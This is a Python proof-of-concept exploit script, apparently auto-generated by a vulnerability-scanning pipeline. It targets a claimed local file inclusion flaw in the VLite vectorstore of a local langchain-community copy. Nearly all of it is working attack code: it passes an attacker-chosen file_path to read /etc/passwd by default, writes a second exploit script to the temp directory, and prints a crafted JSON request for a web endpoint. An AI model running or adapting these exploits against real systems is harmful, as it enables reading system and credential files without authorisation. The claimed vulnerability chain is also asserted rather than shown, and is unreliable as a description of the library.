#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-012
# Sink: __from
# Auto-generated — run with: python3 lfi_add_documents_function_vlite___from.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI vulnerability in langchain-community-only.

Vulnerability: The `add_documents` function in vlite.py accepts a `file_path`
parameter from kwargs, which is attacker-controlled via the entry point
`from_documents`. This path is passed directly to `process_file` without any
validation or sanitization, allowing an attacker to read arbitrary files.

Impact: Local File Inclusion (LFI) - attacker can read any file on the system
that the application has access to (e.g., /etc/passwd).

Usage:
    python3 poc_lfi.py [target_url] [file_to_read]

    If no arguments provided, defaults to reading /etc/passwd from localhost.
"""

import sys
import os
import json
import tempfile
import subprocess
from pathlib import Path

# Configuration
DEFAULT_TARGET = "http://localhost:8000"
DEFAULT_FILE = "/etc/passwd"
ENDPOINT = "/api/v1/trigger"


def create_exploit_script(target_url: str, file_to_read: str) -> str:
    """
    Creates a Python script that exploits the LFI vulnerability.
    
    The script simulates what the vulnerable application does internally:
    1. Creates a VLite instance with from_documents
    2. Passes the malicious file_path in kwargs
    3. The process_file function reads the arbitrary file
    
    Returns the path to the created exploit script.
    """
    exploit_code = f'''#!/usr/bin/env python3
"""
Exploit script for LFI in langchain-community-only vlite.py
Target: {target_url}
File to read: {file_to_read}
"""
import sys
import os
import json
import tempfile

# Add the vulnerable library to path
sys.path.insert(0, "/tmp/langchain-community-only")

# Import the vulnerable module
from langchain_community.vectorstores.vlite import VLite
from langchain_core.documents import Document

def exploit_lfi(file_path: str) -> str:
    """
    Exploit the LFI vulnerability by passing a malicious file_path.
    
    The vulnerability chain:
    1. from_documents() accepts kwargs['file_path']
    2. add_documents() passes it to process_file()
    3. process_file() reads the file without validation
    
    Args:
        file_path: Path to the file to read (e.g., /etc/passwd)
    
    Returns:
        Content of the file if successful
    """
    try:
        # Create a dummy document (required by from_documents)
        dummy_doc = Document(page_content="test", metadata={{}})
        
        # This triggers the vulnerability - file_path is passed to process_file
        # which reads the file without any sanitization
        vlite = VLite.from_documents(
            documents=[dummy_doc],
            embedding=None,  # Not needed for the exploit
            file_path=file_path  # The malicious path
        )
        
        # The file content gets processed and stored in the vectorstore
        # We can retrieve it from the internal state
        if hasattr(vlite, 'texts') and vlite.texts:
            return "\\n".join(vlite.texts)
        elif hasattr(vlite, 'docstore') and vlite.docstore:
            return str(vlite.docstore._dict)
        else:
            return "[!] File was read but content extraction method unknown"
            
    except Exception as e:
        return f"[!] Error during exploitation: {{str(e)}}"

if __name__ == "__main__":
    file_path = sys.argv[1] if len(sys.argv) > 1 else "{file_to_read}"
    print(f"[*] Attempting to read: {{file_path}}")
    result = exploit_lfi(file_path)
    print("[*] File content:")
    print(result)
'''
    
    # Write the exploit script to a temporary file
    exploit_path = os.path.join(tempfile.gettempdir(), "exploit_lfi.py")
    with open(exploit_path, 'w') as f:
        f.write(exploit_code)
    
    # Make it executable
    os.chmod(exploit_path, 0o755)
    
    return exploit_path


def run_local_exploit(file_to_read: str) -> None:
    """
    Run the exploit locally by directly importing the vulnerable module.
    This simulates what would happen if an attacker could call the API.
    """
    print("[*] Running local exploit...")
    print(f"[*] Target file: {file_to_read}")
    
    try:
        # Add the vulnerable library to path
        sys.path.insert(0, "/tmp/langchain-community-only")
        
        # Import the vulnerable module
        from langchain_community.vectorstores.vlite import VLite
        from langchain_core.documents import Document
        
        # Create a dummy document
        dummy_doc = Document(page_content="test", metadata={})
        
        print("[*] Triggering vulnerability via from_documents()...")
        print(f"[*] Passing file_path='{file_to_read}' in kwargs")
        
        # This is the vulnerable call - file_path is passed directly to process_file
        vlite = VLite.from_documents(
            documents=[dummy_doc],
            embedding=None,
            file_path=file_to_read  # The malicious path
        )
        
        print("[+] Exploit triggered successfully!")
        
        # Try to extract the file content
        if hasattr(vlite, 'texts') and vlite.texts:
            print("\n[*] File content:")
            print("=" * 50)
            print("\n".join(vlite.texts))
            print("=" * 50)
        else:
            print("[!] File was read but content extraction method unknown")
            print("[*] Check the vectorstore state manually")
            
    except ImportError as e:
        print(f"[!] Import error: {e}")
        print("[*] Make sure the library is installed at /tmp/langchain-community-only")
    except Exception as e:
        print(f"[!] Error during exploitation: {e}")


def simulate_web_exploit(target_url: str, file_to_read: str) -> None:
    """
    Simulate what a web-based exploit would look like.
    This shows how an attacker would craft the request to the API endpoint.
    """
    print(f"[*] Simulating web exploit against {target_url}{ENDPOINT}")
    print(f"[*] Target file: {file_to_read}")
    
    # The attacker would send a POST request with the malicious file_path
    # in the kwargs that get passed to from_documents()
    
    payload = {
        "documents": [{"page_content": "test", "metadata": {}}],
        "kwargs": {
            "file_path": file_to_read
        }
    }
    
    print("\n[*] Crafted payload:")
    print(json.dumps(payload, indent=2))
    
    print("\n[*] To exploit via web, send:")
    print(f"    POST {target_url}{ENDPOINT}")
    print(f"    Content-Type: application/json")
    print(f"    Body: {json.dumps(payload)}")
    
    print("\n[*] Note: This requires the API endpoint to exist and pass")
    print("[*] the kwargs directly to from_documents()")


def main():
    """Main function to run the PoC."""
    print("=" * 60)
    print("LFI Exploit PoC for langchain-community-only")
    print("=" * 60)
    print()
    
    # Parse arguments
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET
    file_to_read = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_FILE
    
    # Check if the vulnerable library exists
    lib_path = Path("/tmp/langchain-community-only")
    if not lib_path.exists():
        print(f"[!] Vulnerable library not found at {lib_path}")
        print("[*] This PoC requires the library to be installed at that path")
        print("[*] Install with: pip install /tmp/langchain-community-only")
        sys.exit(1)
    
    print(f"[*] Vulnerable library found at: {lib_path}")
    print(f"[*] Target file to read: {file_to_read}")
    print()
    
    # Run the exploit
    run_local_exploit(file_to_read)
    
    print()
    print("=" * 60)
    print("Web Exploit Simulation")
    print("=" * 60)
    print()
    
    simulate_web_exploit(target, file_to_read)
    
    print()
    print("[*] Exploit complete!")
    print("[*] The vulnerability allows reading arbitrary files on the system")
    print("[*] through the unsanitized file_path parameter in from_documents()")


if __name__ == "__main__":
    main()
